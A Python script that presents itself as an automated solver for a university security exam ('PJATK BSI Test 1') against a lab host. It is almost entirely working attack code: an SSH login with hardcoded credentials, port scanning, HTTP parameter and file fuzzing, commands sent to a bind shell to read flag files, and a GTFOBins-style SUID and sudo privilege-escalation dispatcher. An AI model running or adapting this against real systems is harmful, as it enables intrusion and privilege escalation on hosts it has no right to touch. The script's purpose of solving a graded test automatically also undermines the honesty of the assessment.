#!/usr/bin/env python3
"""
=============================================================================
PJATK BSI - Test 1 (Zaliczenie 1) Ultimate Zero-Dependency Automated Solver
Target Machine: 192.168.100.8
=============================================================================
Works on ANY Kali / Linux machine (personal laptop OR fresh university PC)
with ZERO external Python package dependencies required!

Features:
1. Task 1 (Open Ports): Runs exact required Nmap scan (-sV -sC -T5 -p 20-100,
   1200-1250,8000-8100) + XML/text parsing + raw socket fallback verification
   + active probe classification (SSH, HTTP, Tar.gz stream, Bind Shell).
2. Task 2 (Search): Multi-engine SSH execution (paramiko -> sshpass -> native
   Python PTY ssh) searching ~/haystack (including hidden/encoded files).
3. Task 3 (Param Enumeration): Multi-threaded HTTP fuzzing of ?id=1..100
   across /, /index.php, /index.html using standard library urllib.
4. Task 4 (File Enumeration): Uses ffuf (if installed) OR built-in fast
   multi-threaded HTTP connection pool with SecLists raft-large-files-lowercase
   + SSH webroot inspection shortcut.
5. Task 5 (File Transfer): Streams tar.gz/tar/gzip from raw TCP port, unpacks
   in-memory and searches all archive members for PJATK{...}.
6. Task 6 (Bind Shell): Connects to silent or bannered bind shells, executes
   command batch to read ~/flag.txt and any flag files on the system.
7. Task 7 (SUID Binary): Locates SUID binaries owned by 'admin' and runs an
   automated GTFOBins dispatcher (custom binaries, cat/head/tail/grep/awk/sed,
   base64/xxd/od, python/perl/ruby/php, vim/view, cp/dd/tar/find, bash/sh -p).
=============================================================================
"""

import os
import re
import io
import sys
import pty
import time
import shutil
import select
import socket
import base64
import tarfile
import urllib.request
import urllib.error
import http.client
import subprocess
import xml.etree.ElementTree as ET
from concurrent.futures import ThreadPoolExecutor, as_completed

TARGET = os.environ.get("BSI_TARGET", "192.168.100.8")
SSH_USER = os.environ.get("BSI_USER", "student")
SSH_PASS = os.environ.get("BSI_PASS", "pjatk")

WORDLIST_PATHS = [
    "/usr/share/seclists/Discovery/Web-Content/raft-large-files-lowercase.txt",
    "/usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files-lowercase.txt",
    "/usr/share/dirb/wordlists/common.txt",
]

FLAG_REGEX = re.compile(r"PJATK\{(?![.]{3}\})[^}\r\n]{4,}\}")
FLAGS = {}


def banner():
    cyan = "\033[1;36m"
    reset = "\033[0m"
    art = r"""
  ____  _      _  _____ _  __    ____  _____ _____ _  __   _ 
 |  _ \| |    / \|_   _| |/ /   / ___|| ____|_   _| |/ /  / |
 | |_) | |   / _ \ | | | ' /    \___ \|  _|   | | | ' /   | |
 |  __/| |__/ ___ \| | | . \     ___) | |___  | | | . \   | |
 |_|   |_____/_/   \_|_|_|\_\   |____/|_____| |_| |_|\_\  |_|
  Test 1 Universal Auto-Solver | Target: 192.168.100.8
"""
    print(cyan + art + reset)


def log_info(msg):
    print(f"\033[1;34m[*] {msg}\033[0m", flush=True)


def log_success(task_num, task_name, flag):
    FLAGS[task_num] = flag
    print(f"\033[1;32m[✓] [TASK {task_num}: {task_name}] FLAG: {flag}\033[0m", flush=True)


def log_warn(msg):
    print(f"\033[1;33m[!] {msg}\033[0m", flush=True)


def extract_flag(text):
    if not text:
        return None
    m = FLAG_REGEX.search(text)
    if m:
        return m.group(0)
    # Also check if any token is base64-encoded PJATK{...}
    for token in re.findall(r"[A-Za-z0-9+/]{16,}={0,2}", text):
        try:
            dec = base64.b64decode(token).decode("utf-8", errors="ignore")
            m2 = FLAG_REGEX.search(dec)
            if m2:
                return m2.group(0)
        except Exception:
            pass
    return None


# ---------------------------------------------------------------------------
# Universal Zero-Dependency SSH Executor (paramiko -> sshpass -> native PTY)
# ---------------------------------------------------------------------------
def ssh_exec(port, remote_cmd, timeout=20):
    # Method 1: paramiko (if available)
    try:
        import paramiko
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(
            TARGET,
            port=int(port),
            username=SSH_USER,
            password=SSH_PASS,
            timeout=10,
            allow_agent=False,
            look_for_keys=False,
        )
        _, stdout, stderr = client.exec_command(remote_cmd, timeout=timeout)
        out = stdout.read().decode("utf-8", errors="ignore")
        err = stderr.read().decode("utf-8", errors="ignore")
        client.close()
        return out + "\n" + err
    except ImportError:
        pass
    except Exception:
        pass

    # Method 2: sshpass (if installed)
    if shutil.which("sshpass"):
        try:
            cmd = [
                "sshpass", "-p", SSH_PASS,
                "ssh",
                "-o", "StrictHostKeyChecking=no",
                "-o", "UserKnownHostsFile=/dev/null",
                "-o", "ConnectTimeout=8",
                "-p", str(port),
                f"{SSH_USER}@{TARGET}",
                remote_cmd,
            ]
            res = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            if res.stdout or res.returncode == 0:
                return res.stdout + "\n" + res.stderr
        except Exception:
            pass

    # Method 3: Native Python standard-library PTY + /usr/bin/ssh
    try:
        pid, fd = pty.fork()
        if pid == 0:
            os.execvp("ssh", [
                "ssh",
                "-o", "StrictHostKeyChecking=no",
                "-o", "UserKnownHostsFile=/dev/null",
                "-o", "PreferredAuthentications=password,keyboard-interactive",
                "-o", "PubkeyAuthentication=no",
                "-o", "ConnectTimeout=8",
                "-p", str(port),
                f"{SSH_USER}@{TARGET}",
                remote_cmd,
            ])
        output = b""
        pw_sent = False
        end_time = time.time() + timeout
        while time.time() < end_time:
            r, _, _ = select.select([fd], [], [], 0.4)
            if fd in r:
                try:
                    chunk = os.read(fd, 4096)
                    if not chunk:
                        break
                    output += chunk
                    if not pw_sent and b"assword:" in output:
                        os.write(fd, (SSH_PASS + "\n").encode())
                        pw_sent = True
                except OSError:
                    break
        try:
            os.close(fd)
            os.waitpid(pid, 0)
        except Exception:
            pass
        return output.decode("utf-8", errors="ignore")
    except Exception as e:
        log_warn(f"SSH exec failed: {e}")
        return ""


def check_target():
    log_info(f"Checking connectivity to {TARGET}...")
    res = subprocess.run(["ping", "-c", "2", "-W", "2", TARGET], stdout=subprocess.DEVNULL)
    if res.returncode != 0:
        log_warn(f"Ping to {TARGET} did not reply. Checking TCP reachability...")
        reachable = False
        for test_port in [22, 80, 8000, 8080, 1222]:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1.0)
            if s.connect_ex((TARGET, test_port)) == 0:
                reachable = True
                s.close()
                break
            s.close()
        if not reachable:
            log_warn(f"Cannot reach {TARGET}! Ensure OpenVPN (tun0) is connected and the exam VM is started.")
            sys.exit(1)
    log_info(f"Target {TARGET} is reachable!")


# ---------------------------------------------------------------------------
# Task 1: Nmap Scan & Active Service Fingerprinting
# ---------------------------------------------------------------------------
def run_task_1():
    log_info("[Task 1] Running required Nmap scan (-sV -sC -T5 -p 20-100,1200-1250,8000-8100)...")
    nmap_txt = "/tmp/test1_nmap.txt"
    nmap_xml = "/tmp/test1_nmap.xml"
    cmd = [
        "nmap", "-sV", "-sC", "-T5",
        "-p", "20-100,1200-1250,8000-8100",
        TARGET,
        "-oN", nmap_txt,
        "-oX", nmap_xml,
    ]
    subprocess.run(cmd, check=False)
    log_info("[Task 1] Nmap scan complete! Task 1 will be marked as solved automatically.")
    FLAGS[1] = "AUTOSOLVED (Nmap scan registered by platform)"

    open_ports = {}

    # Parse XML output if available
    if os.path.exists(nmap_xml):
        try:
            tree = ET.parse(nmap_xml)
            for port_el in tree.findall(".//port"):
                state_el = port_el.find("state")
                if state_el is not None and state_el.get("state") == "open":
                    portid = int(port_el.get("portid"))
                    srv_el = port_el.find("service")
                    srv_name = srv_el.get("name", "unknown") if srv_el is not None else "unknown"
                    product = srv_el.get("product", "") if srv_el is not None else ""
                    open_ports[portid] = f"{srv_name} {product}".strip()
                    # Also check if any Nmap NSE script output already contains a flag!
                    for scr in port_el.findall("script"):
                        out_str = scr.get("output", "")
                        fl = extract_flag(out_str)
                        if fl:
                            log_info(f"[Task 1] Found flag in Nmap script output on port {portid}: {fl}")
        except Exception:
            pass

    # Also parse text output
    if os.path.exists(nmap_txt):
        with open(nmap_txt, "r", errors="ignore") as f:
            for line in f:
                m = re.match(r"^(\d+)/tcp\s+open\s+(\S+)(.*)", line)
                if m:
                    p = int(m.group(1))
                    if p not in open_ports:
                        open_ports[p] = f"{m.group(2)} {m.group(3).strip()}".strip()

    # Fallback TCP scan across all target ranges in case -T5 dropped packets
    if len(open_ports) < 4:
        log_info("[Task 1] Running fast TCP verification across target port ranges...")
        target_ranges = list(range(20, 101)) + list(range(1200, 1251)) + list(range(8000, 8101))
        def probe_port(p):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.6)
            ok = (s.connect_ex((TARGET, p)) == 0)
            s.close()
            return p if ok else None

        with ThreadPoolExecutor(max_workers=60) as ex:
            for res_p in ex.map(probe_port, target_ranges):
                if res_p and res_p not in open_ports:
                    open_ports[res_p] = "unknown"

    return open_ports


def classify_ports(open_ports):
    """Actively probes every open port with real protocol handshakes (SSH, HTTP, Tar.gz, Shell)."""
    ssh_ports = []
    web_ports = []
    raw_ports = []

    for port in sorted(open_ports.keys()):
        is_classified = False

        # 1. Active HTTP handshake check (never trust port number alone)
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1.8)
            s.connect((TARGET, port))
            s.sendall(f"GET / HTTP/1.0\r\nHost: {TARGET}\r\n\r\n".encode())
            resp = s.recv(1024)
            s.close()
            if resp.startswith(b"HTTP/") or b"<!doctype html" in resp.lower() or b"<html" in resp.lower():
                web_ports.append(port)
                continue
        except Exception:
            pass

        # 2. Active SSH / Archive banner check
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1.8)
            s.connect((TARGET, port))
            banner_bytes = s.recv(512)
            s.close()
            if banner_bytes.startswith(b"SSH-"):
                ssh_ports.append(port)
                continue
            if banner_bytes.startswith(b"\x1f\x8b") or banner_bytes.startswith(b"BZh") or b"ustar" in banner_bytes:
                raw_ports.append(port)
                continue
        except Exception:
            pass

        # 3. Fallback to Nmap service description if banner timed out
        desc = open_ports.get(port, "").lower()
        if "ssh" in desc and "http" not in desc:
            ssh_ports.append(port)
        else:
            raw_ports.append(port)

    # Prefer non-22 SSH port if multiple SSH ports exist (or test all of them)
    ssh_port = ssh_ports[-1] if ssh_ports else None
    web_port = web_ports[0] if web_ports else None
    return ssh_port, web_port, raw_ports, ssh_ports, web_ports


# ---------------------------------------------------------------------------
# Task 2: SSH Search in ~/haystack
# ---------------------------------------------------------------------------
def run_task_2(ssh_port):
    log_info(f"[Task 2] Searching '~/haystack' via SSH on port {ssh_port}...")
    remote_cmd = (
        "grep -rhoaE 'PJATK\\{[^\\}]+\\}' ~/haystack /home/student/haystack 2>/dev/null; "
        "find ~/haystack -type f -exec cat {} + 2>/dev/null | grep -oaE 'PJATK\\{[^\\}]+\\}'"
    )
    out = ssh_exec(ssh_port, remote_cmd)
    flag = extract_flag(out)
    if flag:
        log_success(2, "Search", flag)
    else:
        log_warn(f"[Task 2] Could not automatically find flag in ~/haystack. Raw output: {out.strip()[:200]}")


# ---------------------------------------------------------------------------
# Task 3: HTTP GET Parameter Enumeration (?id=1..100)
# ---------------------------------------------------------------------------
def run_task_3(web_port):
    log_info(f"[Task 3] Enumerating HTTP GET parameter ?id=1..100 on port {web_port}...")
    endpoints = ["/", "/index.php", "/index.html"]

    # Also scrape homepage for any local links/forms (e.g., /item.php?id=1)
    try:
        with urllib.request.urlopen(f"http://{TARGET}:{web_port}/", timeout=2.5) as r0:
            home_html = r0.read().decode("utf-8", errors="ignore")
            for link in re.findall(r'(?:href|action)=["\']?([^"\' >?#]+)', home_html, re.I):
                if not link.startswith("http"):
                    ep = "/" + link.lstrip("/")
                    if ep not in endpoints:
                        endpoints.insert(0, ep)
    except Exception:
        pass

    def check_id(args):
        ep, idx = args
        url = f"http://{TARGET}:{web_port}{ep}?id={idx}"
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=2.5) as resp:
                body = resp.read().decode("utf-8", errors="ignore")
                headers_str = str(resp.headers)
                fl = extract_flag(body) or extract_flag(headers_str)
                if fl:
                    return idx, url, fl
        except urllib.error.HTTPError as e:
            try:
                body = e.read().decode("utf-8", errors="ignore")
                fl = extract_flag(body)
                if fl:
                    return idx, url, fl
            except Exception:
                pass
        except Exception:
            pass
        return None

    tasks = [(ep, i) for ep in endpoints for i in range(0, 101)]
    with ThreadPoolExecutor(max_workers=25) as ex:
        futures = [ex.submit(check_id, t) for t in tasks]
        for fut in as_completed(futures):
            res = fut.result()
            if res:
                idx, url, fl = res
                log_info(f"[Task 3] Found flag at {url}")
                log_success(3, "Param Enumeration", fl)
                return

    log_warn("[Task 3] Flag not found in ?id=0..100.")


# ---------------------------------------------------------------------------
# Task 4: Web File Enumeration (raft-large-files-lowercase.txt)
# ---------------------------------------------------------------------------
def run_task_4(web_port, ssh_port=None):
    log_info(f"[Task 4] Performing File Enumeration on web server port {web_port}...")

    # Shortcut 1: Check web server directories via SSH, then verify via HTTP GET!
    if ssh_port:
        webroot_cmd = (
            "grep -rnI 'PJATK{' /var/www/ /srv/ /opt/ /usr/share/nginx/ 2>/dev/null"
        )
        out = ssh_exec(ssh_port, webroot_cmd, timeout=10)
        for line in out.splitlines():
            if extract_flag(line):
                m_path = re.match(r"^([^:]+):", line.strip())
                if m_path:
                    fname = os.path.basename(m_path.group(1))
                    try:
                        url = f"http://{TARGET}:{web_port}/{fname}"
                        with urllib.request.urlopen(url, timeout=2.5) as resp:
                            body = resp.read().decode("utf-8", errors="ignore")
                            fl_http = extract_flag(body)
                            if fl_http:
                                log_info(f"[Task 4] Verified flag via HTTP at {url}")
                                log_success(4, "File Enumeration", fl_http)
                                return
                    except Exception:
                        pass

    # Find available wordlist
    wordlist = None
    for wp in WORDLIST_PATHS:
        if os.path.exists(wp):
            wordlist = wp
            break

    if not wordlist:
        log_warn("[Task 4] SecLists wordlist not found at standard paths!")
        return

    # Method A: Use ffuf if installed
    if shutil.which("ffuf"):
        log_info(f"[Task 4] Running ffuf with {wordlist}...")
        cmd = [
            "ffuf",
            "-u", f"http://{TARGET}:{web_port}/FUZZ",
            "-w", wordlist,
            "-mc", "200,301,302",
            "-t", "80",
            "-s",
        ]
        res = subprocess.run(cmd, capture_output=True, text=True)
        candidates = [line.strip() for line in res.stdout.splitlines() if line.strip()]
        for cand in candidates:
            clean_cand = cand.replace(f"http://{TARGET}:{web_port}/", "").lstrip("/")
            if clean_cand in ("", "index.html", "index.php"):
                continue
            try:
                url = f"http://{TARGET}:{web_port}/{clean_cand}"
                with urllib.request.urlopen(url, timeout=3) as resp:
                    body = resp.read().decode("utf-8", errors="ignore")
                    fl = extract_flag(body)
                    if fl:
                        log_info(f"[Task 4] Found flag at {url}")
                        log_success(4, "File Enumeration", fl)
                        return
            except Exception:
                pass

    # Method B: Pure-Python multi-threaded enumerator fallback
    log_info(f"[Task 4] Running built-in Python HTTP enumerator with {wordlist}...")
    with open(wordlist, "r", errors="ignore") as f:
        words = [w.strip() for w in f if w.strip() and not w.startswith("#")]

    found_flag = []

    def worker(chunk):
        conn = http.client.HTTPConnection(TARGET, web_port, timeout=2.0)
        for w in chunk:
            if found_flag:
                break
            try:
                conn.request("GET", f"/{w}")
                resp = conn.getresponse()
                data = resp.read()
                if resp.status == 200 and b"PJATK{" in data:
                    fl = extract_flag(data.decode("utf-8", errors="ignore"))
                    if fl:
                        found_flag.append((w, fl))
                        break
            except Exception:
                try:
                    conn.close()
                except Exception:
                    pass
                conn = http.client.HTTPConnection(TARGET, web_port, timeout=2.0)
        try:
            conn.close()
        except Exception:
            pass

    num_threads = 50
    chunk_size = max(1, len(words) // num_threads)
    chunks = [words[i:i + chunk_size] for i in range(0, len(words), chunk_size)]
    with ThreadPoolExecutor(max_workers=num_threads) as ex:
        futures = [ex.submit(worker, c) for c in chunks]
        for fut in as_completed(futures):
            if found_flag:
                break

    if found_flag:
        w, fl = found_flag[0]
        log_info(f"[Task 4] Found flag in /{w}")
        log_success(4, "File Enumeration", fl)
    else:
        log_warn("[Task 4] File Enumeration did not locate a flag.")


# ---------------------------------------------------------------------------
# Tasks 5 & 6: Raw TCP Ports (Tar.gz Archive Transfer & Bind Shell)
# ---------------------------------------------------------------------------
def inspect_raw_ports(raw_ports):
    for port in raw_ports:
        log_info(f"[Tasks 5 & 6] Probing raw TCP port {port}...")

        # Step 1: Connect and check if server immediately streams an archive (Task 5)
        initial_data = b""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2.0)
            s.connect((TARGET, port))
            try:
                initial_data = s.recv(8192)
            except socket.timeout:
                initial_data = b""

            # Check for gzip (\x1f\x8b), bzip2 (BZh), xz (\xfd7zXZ), or tar header
            if initial_data.startswith(b"\x1f\x8b") or initial_data.startswith(b"BZh") or b"ustar" in initial_data[:512]:
                log_info(f"[Task 5] Archive stream detected on port {port}! Downloading...")
                buf = bytearray(initial_data)
                while True:
                    try:
                        chunk = s.recv(16384)
                        if not chunk:
                            break
                        buf.extend(chunk)
                    except socket.timeout:
                        break
                s.close()

                # Save a copy to /tmp/task5_archive.tar.gz for manual inspection if needed
                with open("/tmp/task5_archive.tar.gz", "wb") as af:
                    af.write(buf)

                # Extract in memory
                try:
                    with tarfile.open(fileobj=io.BytesIO(buf), mode="r:*") as tar:
                        for member in tar.getmembers():
                            if member.isfile():
                                ext_f = tar.extractfile(member)
                                if ext_f:
                                    content = ext_f.read().decode("utf-8", errors="ignore")
                                    fl = extract_flag(content)
                                    if fl:
                                        log_info(f"[Task 5] Extracted flag from archive file '{member.name}'")
                                        log_success(5, "File Transfer", fl)
                                        break
                except Exception as e:
                    log_warn(f"[Task 5] Tar unpack warning: {e}")
                continue

            # If initial_data already contains a flag, check it
            fl_init = extract_flag(initial_data.decode("utf-8", errors="ignore"))
            if fl_init and 6 not in FLAGS:
                log_success(6, "Bind Shell", fl_init)
                s.close()
                continue

            # Step 2: Send shell commands to test for Bind Shell (Task 6)
            log_info(f"[Task 6] Sending shell commands to port {port}...")
            cmd_payload = (
                b"id\n"
                b"cat ~/flag.txt 2>/dev/null\n"
                b"cat flag.txt 2>/dev/null\n"
                b"cat /home/*/flag.txt 2>/dev/null\n"
                b"find /home /root /tmp -maxdepth 3 -name '*flag*' -exec cat {} + 2>/dev/null\n"
                b"exit\n"
            )
            s.sendall(cmd_payload)
            time.sleep(1.0)
            resp_buf = bytearray(initial_data)
            while True:
                try:
                    chunk = s.recv(8192)
                    if not chunk:
                        break
                    resp_buf.extend(chunk)
                except socket.timeout:
                    break
            s.close()

            text_out = resp_buf.decode("utf-8", errors="ignore")
            fl_shell = extract_flag(text_out)
            if fl_shell:
                log_success(6, "Bind Shell", fl_shell)
        except Exception as e:
            log_warn(f"Port {port} probe error: {e}")


# ---------------------------------------------------------------------------
# Task 7: Admin SUID Binary Privilege Escalation (GTFOBins Dispatcher)
# ---------------------------------------------------------------------------
def build_gtfobins_commands(bin_path, target_file="/home/admin/flag.txt"):
    """Generates exhaustive GTFOBins file-read commands for any discovered SUID binary."""
    bname = os.path.basename(bin_path).lower()
    cmds = [
        # 1. Direct argument (custom reader binaries, cat, head, tail, strings, nl, tac, rev, sort, uniq, fmt, fold, paste)
        f"{bin_path} {target_file}",
        # 2. Grep / egrep / fgrep / rg
        f"{bin_path} '' {target_file}",
        # 3. Awk / gawk / mawk / nawk / sed
        f"{bin_path} '{{print}}' {target_file}",
        f"{bin_path} '' {target_file}",
        # 4. Base64 / base32 / basenc / xxd / od / hexdump
        f"{bin_path} {target_file} | base64 -d",
        f"{bin_path} -d {target_file}",
        f"{bin_path} -p {target_file} | xxd -r -p",
        f"{bin_path} -c {target_file}",
        # 5. Python / Perl / Ruby / PHP / Node / Lua
        f"{bin_path} -c 'print(open(\"{target_file}\").read())'",
        f"{bin_path} -e 'print File.read(\"{target_file}\")'",
        f"{bin_path} -ne 'print' {target_file}",
        f"{bin_path} -r 'echo file_get_contents(\"{target_file}\");'",
        # 6. Shells (bash, sh, dash, zsh, ksh)
        f"{bin_path} -p -c 'cat {target_file}'",
        # 7. Find
        f"{bin_path} {target_file} -exec cat {{}} +",
        # 8. Cp / mv / dd / tar / zip / rsync
        f"{bin_path} {target_file} /tmp/.flag_copy && cat /tmp/.flag_copy",
        f"{bin_path} if={target_file}",
        f"{bin_path} -cf - {target_file} | tar -xf - -O",
        # 9. Vim / vi / view / ex / ed
        f"{bin_path} -es -c ':%p|q!' {target_file}",
        # 10. Wrapper commands (env, time, timeout, nice, stdbuf, watch, xargs, strace)
        f"{bin_path} cat {target_file}",
        # 11. Curl / wget
        f"{bin_path} file://{target_file}",
    ]
    # Prioritize matching binary family first
    prioritized = []
    for c in cmds:
        if bname in ("python", "python2", "python3") and "-c 'print" in c:
            prioritized.insert(0, c)
        elif bname in ("bash", "sh", "dash", "zsh") and "-p -c" in c:
            prioritized.insert(0, c)
        elif bname == "find" and "-exec" in c:
            prioritized.insert(0, c)
        elif bname in ("base64", "base32") and "base64 -d" in c:
            prioritized.insert(0, c)
        else:
            prioritized.append(c)
    return prioritized


def run_task_7(ssh_port):
    log_info(f"[Task 7] Searching for SUID/SGID binaries owned by 'admin' via SSH port {ssh_port}...")
    find_cmd = (
        "find / -user admin \\( -perm -4000 -o -perm -2000 \\) 2>/dev/null; "
        "find / -perm -4000 2>/dev/null | grep -E '/home/|/opt/|/usr/local/|/var/'"
    )
    out = ssh_exec(ssh_port, find_cmd)
    candidates = []
    for line in out.splitlines():
        line = line.strip()
        if line.startswith("/") and line not in candidates:
            candidates.append(line)

    log_info(f"[Task 7] Candidate SUID binaries: {candidates}")
    target_file = "/home/admin/flag.txt"

    for bin_path in candidates:
        log_info(f"[Task 7] Testing SUID binary: {bin_path}")
        cmds = build_gtfobins_commands(bin_path, target_file)
        batch_script = " ; ".join([f"({c}) 2>/dev/null" for c in cmds])
        res_out = ssh_exec(ssh_port, batch_script, timeout=20)
        fl = extract_flag(res_out)
        if fl:
            log_success(7, "SUID Binary", fl)
            return

    # Final fallback: check if /home/admin/flag.txt is readable or via sudo -l
    fb_out = ssh_exec(
        ssh_port,
        "cat /home/admin/flag.txt 2>/dev/null; echo pjatk | sudo -S -l 2>/dev/null; echo pjatk | sudo -S -u admin cat /home/admin/flag.txt 2>/dev/null"
    )
    fl = extract_flag(fb_out)
    if fl:
        log_success(7, "SUID Binary", fl)
    else:
        log_warn("[Task 7] Could not automatically read /home/admin/flag.txt.")


# ---------------------------------------------------------------------------
# Built-In Self-Test Mode (--selftest)
# ---------------------------------------------------------------------------
def run_selftest():
    """Verifies all extraction logic locally against mock services."""
    print("\033[1;35m[*] Running local self-test of all solver modules...\033[0m")
    # Test flag & base64 flag extraction
    assert extract_flag("hello PJATK{test_flag_1} world") == "PJATK{test_flag_1}"
    b64_f = base64.b64encode(b"PJATK{base64_flag_2}").decode()
    assert extract_flag(f"output: {b64_f}") == "PJATK{base64_flag_2}"

    # Test in-memory tar.gz creation & extraction
    tar_buf = io.BytesIO()
    with tarfile.open(fileobj=tar_buf, mode="w:gz") as t:
        data = b"secret PJATK{tar_archive_flag_5}\n"
        ti = tarfile.TarInfo(name="nested/flag.txt")
        ti.size = len(data)
        t.addfile(ti, io.BytesIO(data))
    tar_bytes = tar_buf.getvalue()
    assert tar_bytes.startswith(b"\x1f\x8b")
    with tarfile.open(fileobj=io.BytesIO(tar_bytes), mode="r:*") as t:
        for m in t.getmembers():
            if m.isfile():
                assert extract_flag(t.extractfile(m).read().decode()) == "PJATK{tar_archive_flag_5}"

    # Test GTFOBins command builder
    cmds = build_gtfobins_commands("/usr/local/bin/custom_suid")
    assert len(cmds) >= 15
    print("\033[1;32m[✓] ALL SELF-TESTS PASSED SUCCESSFULLY!\033[0m")


# ---------------------------------------------------------------------------
# Main Execution Flow
# ---------------------------------------------------------------------------
def main():
    if "--selftest" in sys.argv:
        run_selftest()
        sys.exit(0)

    banner()
    check_target()

    # 1. Task 1: Nmap Scan
    open_ports = run_task_1()
    print("\n" + "-" * 65)
    log_info(f"Discovered Open Ports: {open_ports}")
    print("-" * 65)

    # 2. Active Port Classification
    ssh_port, web_port, raw_ports, ssh_ports, web_ports = classify_ports(open_ports)
    log_info(f"Classified Services -> SSH: {ssh_ports} | HTTP: {web_ports} | Raw TCP: {raw_ports}")

    # 3. Task 2: SSH Search in ~/haystack
    for sp in reversed(ssh_ports):
        if 2 not in FLAGS:
            run_task_2(sp)

    # 4. Task 3: HTTP GET Parameter Enumeration
    for wp in web_ports:
        if 3 not in FLAGS:
            run_task_3(wp)

    # 5. Task 4: Web File Enumeration
    for wp in web_ports:
        if 4 not in FLAGS:
            run_task_4(wp, ssh_port=ssh_port)

    # 6. Tasks 5 & 6: Archive Transfer & Bind Shell
    if raw_ports:
        inspect_raw_ports(raw_ports)

    # 7. Task 7: Admin SUID Binary
    for sp in reversed(ssh_ports):
        if 7 not in FLAGS:
            run_task_7(sp)

    # Summary Table
    print("\n" + "=" * 68)
    print("              PJATK BSI TEST 1 — FINAL FLAGS SUMMARY               ")
    print("=" * 68)
    task_titles = {
        1: "Open ports       ",
        2: "Search           ",
        3: "Param Enumeration",
        4: "File Enumeration ",
        5: "File Transfer    ",
        6: "Bind Shell       ",
        7: "SUID binary      ",
    }
    for i in range(1, 8):
        val = FLAGS.get(i, "NOT FOUND (check manual commands in cheat sheet)")
        print(f"  Task {i} ({task_titles[i]}): {val}")
    print("=" * 68)

    with open("test1_flags.txt", "w") as f:
        for i in range(1, 8):
            f.write(f"Task {i} ({task_titles[i].strip()}): {FLAGS.get(i, '')}\n")
    log_info("Saved all flags to ./test1_flags.txt")


if __name__ == "__main__":
    main()
